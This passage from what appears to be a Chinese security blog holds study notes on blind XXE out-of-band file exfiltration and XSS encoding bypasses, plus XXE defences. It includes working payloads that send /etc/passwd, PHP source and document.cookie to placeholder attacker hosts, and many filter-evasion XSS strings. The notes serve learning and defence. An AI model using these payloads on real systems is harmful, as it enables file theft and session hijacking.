<h5 id="无回显任意文件读取"><a href="#无回显任意文件读取" class="headerlink" title="无回显任意文件读取"></a>无回显任意文件读取</h5><p>php://filter/read=convert.base64-encode/resource=./target.php 获取目标内容<br>然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx</p>
<p>理论上来说 此处使用的逻辑：<br>通过嵌套形式的使用建立带外数据通道</p>
<p>直接在内部实体声明中引用另一个实体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY % param1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param2 SYSTEM &quot;http://xx.xx.xx.xx/?%param1&quot;&gt;</span><br><span class="line">%param2;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
<p>但由于不能在实体声明中引用参数实体，所以只能如下的引用：将嵌套实体声明放入外部实体文件(dtd/xml)<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE xxe [</span><br><span class="line">  &lt;!ELEMENT name ANY &gt;</span><br><span class="line">  &lt;!ENTITY % load SYSTEM &quot;http://xx.xx.xx.xx/xxe/xxe1.dtd&quot;&gt;</span><br><span class="line">  %load;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">xxe1.dtd:</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=s.php&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % top &apos;</span><br><span class="line">      &lt;!ENTITY &amp;#x25; send SYSTEM &quot;http://xx.xx.xx.xx/?%file;&quot;&gt;</span><br><span class="line">  &apos;&gt;</span><br><span class="line">%top; %send;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以在日志中看到：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  &quot;GET /xxe/xxe1.dtd HTTP/1.0&quot; 200 403 &quot;-&quot; &quot;-&quot;</span><br><span class="line">xx.xx.xx.xx - - [28/Dec/2018:12:44:24 +0800] &quot;GET /?PD9waHAKJF8gPSAoJ2EnLidzJy4ncycuJ2UnLidyJy4oJwwnXid4JykpOwokX18gPSAkX0dFVFtfXS4nLy8nOwokX19fPSgkXy4nJyk7CigkX19fKT8kX19fKCRfXyk6JF9fXygkX18pOwo/Pg== HTTP/1.0&quot; 200 2141 &quot;-&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure></p>
<p>达到任意文件读取的目的<br>但etc/passwd 直接读取编码后，（用get请求发送会显示读取字符串太长；初步测试长度hash后2945,但感觉这个数据有点怪异，有可能是其他原因）</p>
<p>此处也可以使用支持的其他协议：</p>
<p>libxml2支持: file/http/ftp</p>
<p>php支持：file/http/ftp/php/compress.zlib/compress.bzip2/data/glob/phar</p>
<p>java支持: http/https/ftp/file/jar/netdoc/mailto/gopher</p>
<p>NET支持:file/http/https/ftp</p>
<h5 id="但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充"><a href="#但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充" class="headerlink" title="但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充"></a>但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充</h5><h4 id="XML解析器"><a href="#XML解析器" class="headerlink" title="XML解析器"></a>XML解析器</h4><p>学习到这里 顺便学一下 XML解析器</p>
<h3 id="XXE危害："><a href="#XXE危害：" class="headerlink" title="XXE危害："></a>XXE危害：</h3><ul>
<li>读取任意文件：</li>
<li>命令执行<br>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装</li>
<li>内网探测/SSRF</li>
<li>拒绝服务</li>
</ul>
<h5 id="XXE防御："><a href="#XXE防御：" class="headerlink" title="XXE防御："></a>XXE防御：</h5><ul>
<li><p>最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD，即禁用外部实体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>
</li>
<li><p>过滤用户提交的XML数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>参考资料：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://docs.ioin.in/writeup/mohemiv.com/_all_exploiting_xxe_with_local_dtd_files_/index.html</span><br><span class="line">https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/</span><br><span class="line">https://blog.csdn.net/u011721501/article/details/43775691</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> XXE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[编码绕过xss]]></title>
      <url>/2018/12/02/xss/%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87XSS/</url>
      <content type="html"><![CDATA[<h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><p>img、video、audio、iframe中的src属性只能请求，不能执行，在ie8以前可以;但可以使用js伪协议调用js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:alert(&apos;iframe&apos;)&quot; width = &quot;0&quot; height = &quot;0&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:var img=document.createElement(&apos;img&apos;);</span><br><span class="line">img.src=&apos;http://xx.xxx.xxx.xxx/log&apos;+escape(document.cookie);</span><br><span class="line">document.body.appendChild(img);&quot;/&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a>Base64编码绕过</h4><p>一般应用场景：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;可控点&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;可控点&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>当在这种情况下 过滤了&lt;&gt;’ “ javascript的话 就可以尝试使用base64编码绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p>这样当test A链接时,就会以data协议 页面以html/text的方式解析 编码为base64 然后单点击a链接时 base64的编码就被还原成原本的</p>
<h4 id="HTML编码16进制-10进制-amp-x-amp"><a href="#HTML编码16进制-10进制-amp-x-amp" class="headerlink" title="HTML编码16进制/10进制 &amp;#x/&amp;"></a>HTML编码16进制/10进制 &amp;#x/&amp;</h4><p>html实体编码本身只是为了防止与html本身语义标记的冲突。html正常只识别html10进制、html16进制,不会在html标签中解析js的那些编码，因此在比如onerror后放置js的编码比如jsunicode、js八进制、js16进制是不会解析的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="magic-quote-gpc绕过"><a href="#magic-quote-gpc绕过" class="headerlink" title="magic_quote_gpc绕过"></a>magic_quote_gpc绕过</h4><p>在遇到php中magic_quote_gpc（版本5.4之后已经移除了） 魔术变量处理开关转义，即便存储到后台的数据也会是转义的，如果输入的数据有<br>单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。针对该设置，进行xss绕过的话，通常使用js的string.fromCharCode()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&apos;id&apos;];</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">http://localhost:8888/ev_php/xss_gpc.php?id=%3Cscript%3Ealert(String.fromCharCode(34,%2049,%2034))%3C/script%3E</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(String.fromCharCode(34, 49, 34))&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>string.fromCharCode()： Unicode 字符值中返回一个字符串</p>
<h4 id="javascript-jsunicode-8进制和16进制"><a href="#javascript-jsunicode-8进制和16进制" class="headerlink" title="javascript jsunicode 8进制和16进制"></a>javascript jsunicode 8进制和16进制</h4><p>[&lt;] 分别是 \u003c \74 \x3c</p>
<h4 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h4><h4 id="头部Base绕过"><a href="#头部Base绕过" class="headerlink" title="头部Base绕过"></a>头部Base绕过</h4><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><p>【1】浏览器在发出url前会进行一次url编码，针对部分字符，以firefox为例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">发出的请求    &apos;&quot; &lt;script&gt;alert(1)&lt;/script&gt; </span><br><span class="line">服务端接收到的请求  %27%22%20%3Cscript%3Ealert(1)%3C/script%3E</span><br><span class="line"></span><br><span class="line">服务端自动解码一次返回数据（默认） </span><br><span class="line">&apos;&quot; &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>这也是为什么提交payload的时候可以不编码、urlencode<br>注意 浏览器的urlencode 应该是不包括%的，和常规的urlencode不太一样</p>
<ul>
<li>双重编码<br>在某些时候测试xss中，可能会遇到payload中被htmlspecialcahrs编码，但可以针对服务端进行双重编码绕过，推测该后端代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=htmlspecialchars($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">echo</span> urldecode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>在该url中经过htmlspecialchars处理后，又再次进行了urldecode，相当于进行了两次urldecode，又因为经过编码绕过了htmlspecialchars的处理，故触发了该xss</p>
<ul>
<li>三重编码<br>和双重绕过类似，推测多出来的一次是因为在htmlspecialchars前又进行了一次编码，如果没有后面那一行”echo urldecode($a);” 过滤是正常的，两者问题都出在此处<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a1=htmlspecialchars($a);</span><br><span class="line"><span class="keyword">echo</span> urldecode($a1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="浏览器编码解码原理"><a href="#浏览器编码解码原理" class="headerlink" title="浏览器编码解码原理"></a>浏览器编码解码原理</h3><p>为了更深入的了解xss的结果和原理，不得不了解浏览器的工作原理，以及解码顺序。<br>浏览器中具有URL解析引擎、HTML解析引擎、JS解析引擎<br>主要构成：</p>
<ul>
<li>用户界面</li>
<li>浏览器引擎－ 用来查询及操作渲染引擎的接口</li>
<li>渲染引擎－ 用来显示请求的内容，例如，如果请求内容为html，它负责解析html及css，并将解析后的结果显示出来</li>
<li>网络－ 用来完成网络调用，例如http请求，它具有平台无关的接口，可以在不同平台上工作</li>
<li>UI 后端－ 用来绘制类似组合选择框及对话框等基本组件，具有不特定于某个平台的通用接口，底层使用操作系统的用户接口</li>
<li>JS解释器－ 用来解释执行JS代码</li>
<li>数据存储－ 属于持久层，浏览器需要在硬盘中保存类似cookie的各种数据，HTML5定义了web database技术，这是一种轻量级完整的客户端存储技术</li>
</ul>
<h4 id="重点是接下来的编码解码顺序"><a href="#重点是接下来的编码解码顺序" class="headerlink" title="重点是接下来的编码解码顺序"></a>重点是接下来的编码解码顺序</h4><p>首先是URL解析:</p>
<ul>
<li>用户在浏览器中填写一个资源定位标识，浏览器在将内容发送给对应的服务器，服务器对浏览器发过来的请求信息进行URL解析，在这个过程中遇到%号时会对该url进行url解码，该解码位置在于服务端自动解码一次，不需要编写代码，浏览器自身是不会进行url解码的<br>案例：</li>
</ul>
<ol>
<li>在客户端提交一次经过urlencode的字符串，在接收到服务端的返回数据时，已经经过urldecode了，而服务端如果直接返回urlencode的数据，浏览器接收到仍然用urlencode的形式渲染，在xss中并不会起作用,测试代码如下，有点乱 小尴尬：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $a1=$_GET[&apos;id&apos;];</span><br><span class="line">echo &quot;1&lt;/br&gt;&quot;;</span><br><span class="line">echo $a2 =&quot;%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>在测试中a2的xss仍然以urlencode的形式返回到浏览器而不会解析，而以get方式提交的id，以urlencode形式提交则会解析触发xss</p>
<ul>
<li>HTMl/SVG/XHTML 解析<br>浏览器在接收到页面数据时，会首先对该数据进行HTML解析来构造DOM树，构造的过程与语言的编译过程是相似的，接收文档，先进行词法分析，然后语法分析，构建解析树。HTML 的分析器只能识别特定的词法规则，才能构建起DOM 树，<strong>这一块，HTML 不会做解码的工作</strong><br>因此以下代码无效：即标签本身结构不能变化<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&amp;#x3d;&quot;http://xxx.xxx.xx.xxx&quot;&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>在DOM构建完成后，才开始识别节点内容<br>对html实体编码的内容进行解码</p>
<h5 id="构造DOM树"><a href="#构造DOM树" class="headerlink" title="构造DOM树"></a>构造DOM树</h5><p>解析树是由DOM元素和属性节点构成的树结构，根节点是Document对象，DOM与标记一一对应<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;h1&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>对应的DOM树：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">st(HTMLDocument)--&gt;a</span><br><span class="line">a(HTML)</span><br><span class="line">a--&gt;b1(head)</span><br><span class="line">a--&gt;b2(body)</span><br><span class="line">b1--&gt;c1(meta)</span><br><span class="line">b1--&gt;c2(title)</span><br><span class="line">b2--&gt;p1(p)</span><br><span class="line">b2--&gt;p2(h)</span><br></pre></td></tr></table></figure></p>
<p>解析过程是迭代的，解析器从词法分析器处取到一个新的符号，并试着用这个符号匹配一条语法规则，如果匹配了一条规则，这个符号对应的节点将被添加到解析树上，然后解析器请求另一个符号。如果没有匹配到规则，解析器将在内部保存该符号，并从词法分析器取下一个符号，直到所有内部保存的符号能够匹配一项语法规则。如果最终没有找到匹配的规则，解析器将抛出一个异常，这意味着文档无效或是包含语法错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如：&lt;img11 src=1 onerror=&apos;a(1)&apos;&gt;</span><br><span class="line">在浏览器解析时会报错：</span><br><span class="line">HTML 文档的字符编码未声明。如果该文件包含 US-ASCII 范围之外的字符，该文件将在某些浏览器配置中呈现为乱码。页面的字符编码必须在文档或传输协议层声明。  untitled.html</span><br></pre></td></tr></table></figure>
<p>而最后输出的树，也就是这里的解析树，是由DOM元素及属性节点组成的<br>DOM树构建完毕后</p>
<p>html编码就会被解析，html解析中无法用常规的自下而上或自上而下的解析器进行解析<br>原因在于：<br>    语言的宽容本质<br>    浏览器历来对一些常见的无效html用法采取包容态度<br>    解析过程需要不断地重复，源内容在解析过程中通常不会改变，但是在 HTML 中，脚本标记如果包含 document.write，就会添加额外的标记，这样解析过程实际上就更改了输入内容，浏览器创建了自定义的解释器来解析HTML</p>
<ul>
<li>html解释器算法</li>
</ul>
<p>标记化和树构建<br>标记化是词法分析过程、将输入内容解析成多个标记<br>构建解析流程图如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">st[network]--&gt;a1</span><br><span class="line">a1[tokeniser]--&gt;a2</span><br><span class="line">a2&#123;tree construction&#125;--&gt;a3[DOM]</span><br><span class="line">a2&#123;tree construction&#125;--&gt;a4[ScriptExecution]</span><br><span class="line">a4[ScriptExecution]--&gt;a1</span><br><span class="line">a3--&gt;a4</span><br></pre></td></tr></table></figure></p>
<p>标记生成器识别标记，传递给树构造器，然后接受下一个字符以识别下一个标记；如此反复直到输入的结束</p>
<h5 id="js解释器"><a href="#js解释器" class="headerlink" title="js解释器"></a>js解释器</h5><p>在处理如<br>“script、style”这样的标签，解释器会切换到特殊解析模式，在src href 后边加入的JavaScript 等的html解码后，进入js的解析模式，进入该模式后，该DOM节点已经建立起了。</p>
<p>所以先进行jsunincode编码再进行html编码可以正常触发<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert&amp;#40;&amp;#39;&amp;#60;&amp;#92;&amp;#117;&amp;#52;&amp;#101;&amp;#48;&amp;#48;&amp;#62;&amp;#39;&amp;#41;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>在测试中 先进行html实体编码，再进行js16进制转码，不会正常解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">源码:&lt;a href=&quot;javascript:alert(&apos;test&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>测试输出为unicode编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先html:</span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&apos;)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">再js16进制：</span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;\x26\x23\x31\x31\x36\x3b\x26\x23\x31\x30\x31\x3b\x26\x23\x31\x31\x35\x3b\x26\x23\x31\x31\x36;&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>正常输出：test<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(&apos;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先js 16进制:</span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;\x74\x65\x73\x74&apos;)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">再html编码：</span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>先进行html编码再进行unicode编码 解析失败<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:\u0026\u0023\u0039\u0037\u003b\u0026\u0023\u0031\u0030\u0038\u003b\u0026\u0023\u0031\u0030\u0031\u003b\u0026\u0023\u0031\u0031\u0034\u003b\u0026\u0023\u0031\u0031\u0036\u003b(&apos;1111&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>先进行unicode编码再进行html编码解析成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;(&apos;1111&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>综上 浏览器对于编码解码的顺序 url解码-html解码-js解码</p>
<p>tips:经测试 js16进制/8进制只会在js 字符串中解析，如果作为变量名、触发事件则不会解析如：</p>
<p>思考：&lt;&lt;白帽子讲Web安全&gt;&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var x2=\x61\x6c\x65rt(1);</span><br><span class="line">    var x1=&quot; &apos;onclick=alert(1);//&apos;&quot;</span><br><span class="line">    var x=&quot;\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\27&quot;;</span><br><span class="line">    document.write(&quot;&lt;a href=&apos;&quot;+x1+&quot;&apos;&gt;test&lt;a&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以用以下例子来尝试看一下弹窗顺序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=1 onerror=&apos;a(1)&apos;&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    a(2);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function a(c)&#123;</span><br><span class="line">        alert(c);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    a(3);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>参考 0x_Jin 凯神的<a href="http://su.xmd5.org/static/drops/tips-689.html" target="_blank" rel="noopener">《XSS与字符编码那些事儿》</a></p>
<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><h5 id="xss中禁用了-amp-符号"><a href="#xss中禁用了-amp-符号" class="headerlink" title="xss中禁用了&amp;#符号"></a>xss中禁用了&amp;#符号</h5><p>实体编码是由&amp;#组成的，这个时候只能考虑能不能通过url编码绕过&amp;#，再让浏览器解码成 &amp;# 然后拼接x27 最后就成为了单引号的html16进制编码来绕过<br>借用凯神的案例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:location=&apos;./3.3.php?offset=&apos;+document.getElementById(&apos;pagenum&apos;).value+&apos;&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=&apos;&quot;&gt;GO&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>提交的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wooyun%26%23x27,alert(1)%2b%26%23x27</span><br></pre></td></tr></table></figure></p>
<p>解码后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;,alert(1)&apos;</span><br></pre></td></tr></table></figure></p>
<p>感谢在@星尘的指导下，从新捋了捋xss编码的问题，现阶段就暂时到这吧。还是沉淀不够。革命尚未成功，同志尚需努力啊 by @流云</p>
<h4 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h4><p>在线编码解码工具：<br><a href="https://www.mokuge.com/tool/unicode/" target="_blank" rel="noopener">https://www.mokuge.com/tool/unicode/</a></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
